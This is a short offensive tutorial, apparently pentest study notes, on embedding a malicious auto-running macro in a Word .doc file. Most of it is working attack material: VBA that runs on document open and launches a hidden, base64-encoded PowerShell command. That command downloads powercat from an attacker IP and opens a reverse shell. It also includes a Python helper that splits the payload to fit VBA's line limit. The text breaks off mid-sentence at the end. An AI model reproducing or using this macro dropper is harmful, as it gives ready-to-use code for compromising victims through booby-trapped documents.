# Malicious Microsoft Word File

---

We can embedd an macro inside an word file to get an RCE on the target system.

1. Step: Open Word Document (.doc not .docx) > View > Macros
2. Step: Create Macro File
3. Step: Paste the following inside macro template.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    <insert here>
    CreateObject("Wscript.Shell").Run Str
End Sub
```

4. Step: Add base64 encoded malicious script which will be executed, in our case we will upload nc.exe onto the target system from our local machine & execute it to gain RCE.

```
echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175/powercat.ps1');powercat -c 192.168.45.175 -p 1337 -e powershell" | iconv -t utf-16le | base64 -w 0
```

Since VBA can only execute 255 characters each line, we can utilize the automate.py script in order to add our base64 encoded script inside <insert here>.

```
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```


Final output should look similiar to this:

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
      Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
      Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC40NS4xNzUvcG93ZXJjYXQucHM"
      Str = Str + "xJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNzUgLXAgMTMzN"
      Str = Str + "yAtZSBwb3dlcnNoZWxsCg=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

We can then download the file onto our local machine to utilie it further using the following command:

